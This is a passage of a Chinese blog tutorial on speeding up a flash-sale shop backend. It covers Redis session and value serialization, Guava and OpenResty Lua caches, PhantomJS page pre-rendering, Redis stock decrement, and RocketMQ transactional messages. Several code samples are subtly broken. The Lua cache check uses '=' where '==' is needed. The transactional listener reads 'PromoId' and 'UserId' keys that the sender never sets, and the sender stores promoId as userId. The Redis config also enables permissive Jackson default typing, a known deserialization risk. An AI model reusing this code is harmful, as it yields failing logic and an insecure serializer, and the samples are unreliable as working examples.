配置类：使用上面的序列化和反序列化方式</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/9/1 10:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@EnableRedisHttpSession</span>(maxInactiveIntervalInSeconds = <span class="number">3600</span>) <span class="comment">//最大存活时间</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span></span>&#123;</span><br><span class="line">        RedisTemplate redisTemplate = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">        redisTemplate.setConnectionFactory(redisConnectionFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先解决key的序列化方式</span></span><br><span class="line">        StringRedisSerializer stringRedisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        redisTemplate.setKeySerializer(stringRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解决value的序列化方式，使用json</span></span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        SimpleModule simpleModule = <span class="keyword">new</span> SimpleModule();</span><br><span class="line">        simpleModule.addSerializer(DateTime<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">JodaDateTimeJsonSerializer</span>())</span>;</span><br><span class="line">        simpleModule.addDeserializer(DateTime<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">JodaDateTimeJsonDeserializer</span>())</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注意第二行的方式已经被遗弃，官方建议的方式如下</span></span><br><span class="line">        objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        <span class="comment">//objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span></span><br><span class="line">        objectMapper.registerModule(simpleModule);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line">        redisTemplate.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>再次部署发现，使用<code>redis</code>能明显提高并发量：</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200901211222409.png" alt="image-20200901211222409"></p><h5 id="本地热点缓存"><a href="#本地热点缓存" class="headerlink" title="本地热点缓存"></a>本地热点缓存</h5><blockquote><p>对于超高频的数据，访问redis依然会有比较大的开销，所以设计本地热点数据缓存非常有必要</p></blockquote><ol><li>热点数据</li><li>脏读不敏感</li><li>内存可控</li></ol><p>理论上要满足后面两点，<strong>本地缓存必须比redis生命周期要短</strong>。</p><blockquote><p>注意：<strong>本地缓存不能使用<code>ConcurrentHashMap</code>，因为put操作加锁后对读锁的性能影响较大，而且还要考虑淘汰机制</strong></p></blockquote><p>使用<code>Guava cache</code>：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200901212647586.png" alt="image-20200901212647586" style="zoom:50%"><blockquote><p>引入POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>22.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>定义CacheServiceImpl</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/9/1 21:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheServiceImpl</span> <span class="keyword">implements</span> <span class="title">CacheService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Cache&lt;String, Object&gt; commonCache = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该注解定义bean依赖注入后的初始化方法</span></span><br><span class="line">    <span class="comment">//目的是不让commonCache一开始就生成在内存中</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        commonCache = CacheBuilder.newBuilder()</span><br><span class="line">                .initialCapacity(<span class="number">10</span>)<span class="comment">//初始容量</span></span><br><span class="line">                .maximumSize(<span class="number">100</span>)<span class="comment">//最大容量，超过后，按照LRU策略移除缓存项</span></span><br><span class="line">                .expireAfterWrite(<span class="number">60</span>, TimeUnit.SECONDS)<span class="comment">//写后多少秒过期</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommonCache</span><span class="params">(String key, Object value)</span> </span>&#123;</span><br><span class="line">        commonCache.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getFromCommonCache</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> commonCache.getIfPresent(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后取数据的顺序为：<strong>先找本地缓存，本地不存在找redis，然后再找mysql</strong></p><blockquote><p>再次测试Jmeter可以达到<code>3000TPS</code></p></blockquote><hr><h5 id="nginx-proxy-cache缓存"><a href="#nginx-proxy-cache缓存" class="headerlink" title="nginx proxy cache缓存"></a>nginx proxy cache缓存</h5><ol><li>nginx反向代理前置</li><li>依靠文件系统存索引级的文件</li><li>依靠内存缓存文件地址</li></ol><blockquote><p><strong>由于nginx的缓存使用的是文件系统，并非缓存在内存上，所以这样配置并不能提高并发量</strong></p></blockquote><hr><blockquote><p>nginx lua</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902173312029.png" alt="nginx lua" style="zoom:67%"><blockquote><p>lua协程机制</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902173507164.png" alt="image-20200902173507164" style="zoom:80%"><blockquote><p>nginx协程</p></blockquote><p><code>举例</code>：nginx遇到请求需要反向代理到后端服务器，等待后端服务器返回，协程便放弃自己的执行权限，<strong>将与后端的socket事件注册到epoll事件中</strong>，等待epoll事件被唤醒回调，nginx又会创建新的协程来完成后续操作</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902175227355.png" alt="image-20200902175227355" style="zoom:67%"> <img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902175419543.png" alt="image-20200902175419543" style="zoom:67%"><blockquote><p>lua插载点</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902180016713.png" alt="image-20200902180016713"></p><blockquote><p>常用插载点</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902180558228.png" alt="image-20200902180558228" style="zoom:80%"><blockquote><p>OpenResty实践</p></blockquote><ul><li>openresty hello world</li><li><code>shared dic</code>:共享内存字典，所有worker进程可见，Iru淘汰</li></ul><blockquote><p>lua脚本使用<code>share dic</code></p></blockquote><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_from_cache</span><span class="params">(key)</span></span></span><br><span class="line">        <span class="keyword">local</span> cache_ngx = ngx.shared.my_cache</span><br><span class="line">        <span class="keyword">local</span> value = cache_ngx.get(key)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_to_cache</span><span class="params">(key, value, exptime)</span></span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exptime <span class="keyword">then</span></span><br><span class="line">                exptime = <span class="number">0</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> cache_ngx = ngx.shared.my_cache</span><br><span class="line">        <span class="keyword">local</span> succ, err, forcible = cache_ngx:set(key, value, exptime)</span><br><span class="line">        <span class="keyword">return</span> succ</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> args = ngx.req.get_uri_args()</span><br><span class="line"><span class="keyword">local</span> id = args[<span class="string">"id"</span>]</span><br><span class="line"><span class="keyword">local</span> item_model = get_from_cache(<span class="string">"item_"</span>..id)</span><br><span class="line"><span class="keyword">if</span> item_model = <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> resp = ngx.location.capture(<span class="string">"/item/get?id="</span>..id)</span><br><span class="line">        item_model = resp.body</span><br><span class="line">        set_to_cache(<span class="string">"item_"</span>..id, item_model, <span class="number">1</span>*<span class="number">60</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><blockquote><p>nginx使用redis</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200902205723205.png" alt="image-20200902205723205"></p><h4 id="查询优化之页面静态化"><a href="#查询优化之页面静态化" class="headerlink" title="查询优化之页面静态化"></a>查询优化之页面静态化</h4><blockquote><p>静态请求CDN</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903100238028.png" alt="image-20200903100238028" style="zoom:80%"><blockquote><p>回源缓存</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903100756596.png" alt="image-20200903100756596"></p><blockquote><p>有效性判断</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903101054624.png" alt="image-20200903101054624"></p><blockquote><p>浏览器刷新方式</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903101337847.png" alt="image-20200903101337847"></p><ul><li>ctrl+F5或commond+shift+R刷新:去掉cache-control<br>和协商头，强制刷新</li><li>协商机制，比较Last-modified和ETag到服务端，若服务端<br>判断没变化则304不返回数据，否则200返回数据</li></ul><blockquote><p>CDN自定义缓存策略</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903103842078.png" alt="image-20200903103842078" style="zoom:80%"><hr><blockquote><p>静态资源部署策略</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903104638201.png" alt="image-20200903104638201" style="zoom:80%"> <img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903104818774.png" alt="image-20200903104818774" style="zoom:80%"><hr><h5 id="全页面静态化"><a href="#全页面静态化" class="headerlink" title="全页面静态化"></a>全页面静态化</h5><p><strong>定义:</strong></p><ul><li>在服务端完成html , css，甚至js的load渲染成纯html文件后直接以静态资源的方式部署到cdn上</li></ul><p>全页面静态化技术类似于爬虫技术</p><blockquote><p><code>phantomjs</code></p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903110933494.png" alt="image-20200903110933494"></p><blockquote><p>示例：首先编写一个爬虫js文件，该爬虫负责获取前端页面</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">"webpage"</span>).create();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line">page.open(<span class="string">"http://localhost:8080/resources/getitem.html?id=21"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">status</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"status = "</span> + status);</span><br><span class="line">                <span class="keyword">var</span> isInit = <span class="string">"0"</span>;</span><br><span class="line">                setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(isInit != <span class="string">"1"</span>)&#123;</span><br><span class="line">                                page.evaluate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                                        initView();     </span><br><span class="line">                                &#125;);     </span><br><span class="line">                                isInit = page.evaluate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                                        <span class="keyword">return</span> hasInit();</span><br><span class="line">                                &#125;);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                fs.write(<span class="string">"getitem.html"</span>, page.content, <span class="string">"w"</span>);</span><br><span class="line">                                phantom.exit();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><blockquote><p>修改前端页面：使得ajax请求可以被爬虫控制</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> id=<span class="string">"isInit"</span> value=<span class="string">"0"</span>/&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasInit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> isInit = $(<span class="string">"#isInit"</span>).val();</span><br><span class="line">    <span class="keyword">return</span> isInit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setHasInit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">"#isInit"</span>).val(<span class="string">"1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initView</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> isInit = hasInit();</span><br><span class="line">    <span class="keyword">if</span>(isInit == <span class="string">"1"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用ajax获取商品详情</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type:<span class="string">"GET"</span>,</span><br><span class="line">        url: <span class="string">"http://"</span>+g_host+<span class="string">"/item/get"</span>,</span><br><span class="line">        data:&#123;</span><br><span class="line">            <span class="string">"id"</span>: getParam(<span class="string">"id"</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">        xhrFields:&#123;<span class="attr">withCredentials</span>:<span class="literal">true</span>&#125;,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(data.status == <span class="string">"success"</span>)&#123;</span><br><span class="line">                g_itemVO = data.data;</span><br><span class="line">                reloadDom();</span><br><span class="line">                setInterval(reloadDom, <span class="number">1000</span>);</span><br><span class="line">                setHasInit();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                alert(<span class="string">"获取信息失败，原因为"</span>+data.data.errMsg)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error:<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            alert(<span class="string">"获取信息失败，原因为"</span>+data.responseText)</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="交易优化之缓存库存"><a href="#交易优化之缓存库存" class="headerlink" title="交易优化之缓存库存"></a>交易优化之缓存库存</h4><p>下单的性能瓶颈：</p><blockquote><p>一次下单至少产生6次的数据库I/O操作，实际上是非常耗时的</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903155243655.png" alt="image-20200903155243655" style="zoom:67%"> <img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903155315817.png" alt="image-20200903155315817" style="zoom:67%"><blockquote><p>上面的<code>用户信息</code>和<code>活动信息</code>查询都可以使用redis缓存来优化，Jmeter压测结果提升会相当明显</p></blockquote><hr><p>库存表添加索引：因为每次写都添加行锁必然要对应有索引，不然速度会很慢</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> item_stock <span class="keyword">add</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> item_id_index(item_id)</span><br></pre></td></tr></table></figure><blockquote><p>库存行锁优化</p></blockquote><ul><li><strong>扣减库存缓存化</strong></li><li><strong>异步同步数据库</strong></li><li><strong>库存数据库最终一致性保证</strong></li></ul><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903171306189.png" alt="image-20200903171306189" style="zoom:67%"><blockquote><p>活动发布服务</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publishPromo</span><span class="params">(Integer promoId)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过活动id获取活动</span></span><br><span class="line">    PromoDO promoDO = promoDOMapper.selectByPrimaryKey(promoId);</span><br><span class="line">    <span class="keyword">if</span>(promoDO.getItemId() == <span class="keyword">null</span> || promoDO.getItemId().intValue() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ItemModel itemModel = itemService.getItemById(promoDO.getItemId());</span><br><span class="line">    <span class="comment">//这样设计的前提是秒杀商品在活动开始前不能进行售卖，否则库存会与缓存不一致</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将库存同步到redis内</span></span><br><span class="line">    redisTemplate.opsForValue().set(<span class="string">"promo_item_stock_"</span>+ itemModel.getId(), itemModel.getStock());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>控制层：由运维调用该方法</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value = <span class="string">"/publishpromo"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonReturnType <span class="title">publishPromo</span><span class="params">(@RequestParam(<span class="string">"id"</span>)</span>Integer id) </span>&#123;</span><br><span class="line">    promoService.publishPromo(id);</span><br><span class="line">    <span class="keyword">return</span> CommonReturnType.create(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>减库存操作</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">decreaseStock</span><span class="params">(Integer itemId, Integer amount)</span> <span class="keyword">throws</span> BusinessException </span>&#123;</span><br><span class="line">    <span class="comment">//int affectedRow = itemStockDOMapper.decreaseStock(itemId, amount);</span></span><br><span class="line">    Long result = redisTemplate.opsForValue().increment(<span class="string">"promo_item_stock_"</span> + itemId, amount.intValue() * -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(result &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//更新成功</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//更新库存失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>问题：<strong>上面的操作会有数据库记录不一致问题</strong></p><p>解决方案：<strong>使用异步消息扣减数据库库存</strong></p><blockquote><p>使用rockmq来发送异步消息</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903180924669.png" alt="image-20200903180924669" style="zoom:80%"><blockquote><p>分布式事务</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903181450189.png" alt="image-20200903181450189" style="zoom:80%"><p>显然分布式事务中，无法同时满足<code>CAP</code>理论，因此<code>BASE</code>理论提出了柔性事务，即满足最终的一致性即可</p><blockquote><p>使用异步消息存在的问题</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200903214017836.png" alt="image-20200903214017836" style="zoom:80%"><blockquote><p><strong>缺少下单的记录</strong>，一旦失败，无法回滚</p></blockquote><h4 id="交易性能优化之事务型消息"><a href="#交易性能优化之事务型消息" class="headerlink" title="交易性能优化之事务型消息"></a>交易性能优化之事务型消息</h4><p>由于在下单的整个事务中，落单成功，但是入库可能失败，导致这个事务回滚，而库存却被扣减的问题。</p><blockquote><p>思路1：<strong>在下单的整个事务之后添加一个后执行方法，允许扣减redis库存，但必须等事务提交了再发送<code>异步消息</code>到数据库库存，保证在事务发送回滚时，库存不会被扣减</strong></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransactionSynchronizationManager.registerSynchronization(</span><br><span class="line">        <span class="keyword">new</span> TransactionSynchronization() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCommit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//异步更新库存，当上面的事务回滚，下面异步消息不会发送，数据库不会减库存</span></span><br><span class="line">                <span class="keyword">boolean</span> mqResult = itemService.asyncDecreaseStock(itemId, amount);</span><br><span class="line">                <span class="comment">/*if(!mqResult)&#123;</span></span><br><span class="line"><span class="comment">                    itemService.increaseStock(itemId, amount);</span></span><br><span class="line"><span class="comment">                    throw new BusinessException(EmBusinessError.MQ_SEND_FAIL);</span></span><br><span class="line"><span class="comment">                &#125;*/</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面的方法依然存在问题：无法保证<code>异步消息</code>绝对的可以被发送，如果刚好在<code>afterCommit</code>方法发送异常，就依然会导致库存更新失败。</p><blockquote><p>思路2：使用rocketMQ的事务型消息</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostConstruct</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> MQClientException </span>&#123;</span><br><span class="line">    <span class="comment">//做mq producer的初始化</span></span><br><span class="line">    producer = <span class="keyword">new</span> DefaultMQProducer(<span class="string">"producer_group"</span>);</span><br><span class="line">    producer.setNamesrvAddr(nameAddr);</span><br><span class="line"></span><br><span class="line">    producer.start();</span><br><span class="line"></span><br><span class="line">    transactionMQProducer =</span><br><span class="line">            <span class="keyword">new</span> TransactionMQProducer(<span class="string">"transaction_producer_group"</span>);</span><br><span class="line">    transactionMQProducer.setNamesrvAddr(nameAddr);</span><br><span class="line">    transactionMQProducer.start();</span><br><span class="line">    transactionMQProducer.setTransactionListener(<span class="keyword">new</span> TransactionListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> LocalTransactionState <span class="title">executeLocalTransaction</span><span class="params">(Message message, Object args)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//真正要做的事，创建订单</span></span><br><span class="line">            Integer itemId = (Integer) ((Map)args).get(<span class="string">"itemId"</span>);</span><br><span class="line">            Integer promoId = (Integer) ((Map)args).get(<span class="string">"PromoId"</span>);</span><br><span class="line">            Integer userId = (Integer) ((Map)args).get(<span class="string">"UserId"</span>);</span><br><span class="line">            Integer amount = (Integer) ((Map)args).get(<span class="string">"amount"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                orderService.createOrder(userId, itemId, promoId, amount);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (BusinessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> LocalTransactionState <span class="title">checkLocalTransaction</span><span class="params">(MessageExt messageExt)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//事务型同步库存扣减消息</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">transactionAsyncReduceStock</span><span class="params">(Integer userId, Integer promoId, Integer itemId, Integer amount)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; bodyMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;String, Object&gt; argsMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    bodyMap.put(<span class="string">"itemId"</span>, itemId);</span><br><span class="line">    bodyMap.put(<span class="string">"amount"</span>, amount);</span><br><span class="line"></span><br><span class="line">    argsMap.put(<span class="string">"itemId"</span>, itemId);</span><br><span class="line">    argsMap.put(<span class="string">"amount"</span>, amount);</span><br><span class="line">    argsMap.put(<span class="string">"userId"</span>, promoId);</span><br><span class="line">    argsMap.put(<span class="string">"promoId"</span>, promoId);</span><br><span class="line"></span><br><span class="line">    TransactionSendResult transactionSendResult = <span class="keyword">null</span>;</span><br><span class="line">    Message message = <span class="keyword">new</span> Message(topicName, <span class="string">"increase"</span></span><br><span class="line">            , JSON.toJSON(bodyMap).toString().getBytes(Charset.forName(<span class="string">"UTF-8"</span>)));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        transactionSendResult = transactionMQProducer.sendMessageInTransaction(message, argsMap);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (MQClientException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(transactionSendResult.getLocalTransactionState() == LocalTransactionState.ROLLBACK_MESSAGE)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(transactionSendResult.getLocalTransactionState() == LocalTransactionState.COMMIT_MESSAGE)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接在控制层调用<code>transactionAsyncReduceStock</code>方法即可：</p><p>该方法的逻辑为：<code>bodyMap</code>为要发送的消息，<code>argsMap</code>为参数，<code>sendMessageInTransaction</code>往<code>rocketMQ</code>发送消息的同时回调<code>executeLocalTransaction</code>方法并将参数传递进去，在该方法内部调用订单创建的方法。</p><hr><h5 id="库存流水"><a href="#库存流水" class="headerlink" title="库存流水"></a>库存流水</h5><p>上面的操作还存在一个本质问题，<strong>没有库存流水</strong>，也就是去redis查询时并不知道是哪一笔订单出了问题。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200904112701538.png" alt="image-20200904112701538" style="zoom:80%"><blockquote><p>新建一张表来记录流水</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for stock_log</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`stock_log`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`stock_log`</span> (</span><br><span class="line">  <span class="string">`stock_log_id`</span> <span class="built_in">varchar</span>(<span class="number">64</span>) <span 